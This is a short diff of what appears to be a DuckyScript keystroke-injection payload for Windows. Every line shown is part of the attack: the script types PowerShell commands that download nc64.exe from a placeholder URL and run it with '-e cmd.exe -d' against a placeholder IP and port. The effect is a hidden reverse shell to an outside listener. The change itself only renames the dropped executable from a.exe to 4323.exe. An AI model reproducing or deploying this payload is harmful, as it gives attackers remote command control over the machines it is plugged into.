@@ -21,11 +21,11 @@ STRING Set-Location $path
 ENTER
 
 REM Download nc64.exe
-STRING Invoke-Webrequest http://<HOSTED_URL>/nc64.exe -OutFile a.exe
+STRING Invoke-Webrequest http://<HOSTED_URL>/nc64.exe -OutFile 4323.exe
 ENTER
 
 REM Connect to listener
-STRING ./a.exe <IP_ADDR> <PORT> -e cmd.exe -d
+STRING ./4323.exe <IP_ADDR> <PORT> -e cmd.exe -d
 ENTER
 
 REM Exit Powershell
